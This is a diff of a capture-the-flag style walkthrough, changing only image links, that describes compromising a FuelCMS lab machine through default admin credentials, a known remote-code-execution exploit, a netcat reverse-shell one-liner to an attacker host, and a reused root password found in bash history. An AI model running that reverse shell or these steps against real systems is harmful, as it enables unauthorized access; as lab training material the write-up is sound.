@@ -13,19 +13,19 @@ First things first, lets run our nmap scan.  I use a custom script that scans fo
 
 `nmap -p- -A 172.31.1.28`
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d84799e8-41a0-4f6c-bfb4-d09ce25c4625/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d84799e8-41a0-4f6c-bfb4-d09ce25c4625/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032719-8d6a0780-768b-11eb-8e02-5ee7469b6f5f.png)
 
 Lets check out port 80
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d4ff7aa-600e-403a-bce6-b2872712c527/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d4ff7aa-600e-403a-bce6-b2872712c527/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032751-95c24280-768b-11eb-9478-df37555e46c1.png)
 
 Looks like we have FuelCMS here.  According to the robots.txt results from the nmap scan, /fuel is disallowed for serach engines so lets go there and see what we can find.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0599241c-6de5-4db5-a7d2-fc4f5ebc02d8/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0599241c-6de5-4db5-a7d2-fc4f5ebc02d8/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032788-9eb31400-768b-11eb-83cc-41029f30987a.png)
 
 We have a login, first thing I like to do is try default logins and sure enough **admin:admin** worked.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f945cfbb-ecfa-4e8a-ae53-b4c64a0d4956/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f945cfbb-ecfa-4e8a-ae53-b4c64a0d4956/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032835-a7a3e580-768b-11eb-8481-2aed5d2cb39d.png)
 
 Nice, after looking around for a while I couldn't figure anything out to exploit this further from the admin panel so I decided to look up some potential exploits for this version and found the following.
 
@@ -35,21 +35,21 @@ This is a RCE vuln that sends the malicious url with the command we want to send
 
 I admit, I got stuck on this for a while thinking it wouldn't work, trying to move to a different path thinking this exploit is broken before coming back.  When I first ran the exploit, I first ran **whoami** like this.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e506c9e1-071a-4c7c-bc96-03c265b8e32b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e506c9e1-071a-4c7c-bc96-03c265b8e32b/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032878-b38fa780-768b-11eb-925d-a393cf2f5677.png)
 
 So I sent to Repeater and got this response.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032909-be4a3c80-768b-11eb-93fb-43d06335e8d7.png)
 
 I saw the **systemmoira** and thought yeah they looks like the return to the command I issued.  I then decided to modify the request within burp to issue the command **id**
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032940-c73b0e00-768b-11eb-8dc9-8b69d56c2403.png)
 
 But I got the same outcome... Everytime I came back to this exploit, just knowing this was the path onto the machine, but just couldn't get it to work.
 
 Then after just turning intercept off of burp and trying the command I saw the output I needed from the command window
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3a747222-b422-4870-85cf-453b9d0caa0e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3a747222-b422-4870-85cf-453b9d0caa0e/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109032980-d02bdf80-768b-11eb-908a-a5bee4f54880.png)
 
 Finally!  Now that I ran a few different commands such as **pwd** and **ls -l** and got different results I knew I was on the right track.  Not sure why I was getting weird results through brup but either way I moved on.
 
@@ -57,12 +57,12 @@ I used the netcat reverse shell one liner below to get a shell onto the machine.
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.11 1234 >/tmp/f`
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/671de87a-cece-46ee-bbc4-18b935820aed/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/671de87a-cece-46ee-bbc4-18b935820aed/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109033027-d8841a80-768b-11eb-873e-af96aa1c6646.png)
 
 Now time to copy over LinPEAS and see what we can find
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b14da16c-c8bf-4e18-9642-a246045c3004/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b14da16c-c8bf-4e18-9642-a246045c3004/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109033069-e33eaf80-768b-11eb-864e-3af9e5b8198e.png)
 
 I found the output of **.bash_history** to be interesting.  We see the password for moira.  I tried a few things such as **sudo -l** but ended up finding that the root password is the same as moira's.  So a simple **su root** is all that is needed.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1053b8f-337c-4255-a7cf-f027c52ca478/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1053b8f-337c-4255-a7cf-f027c52ca478/Untitled.png)
+![image](https://user-images.githubusercontent.com/50459517/109033115-eb96ea80-768b-11eb-8bf2-b21c37ad0d08.png)
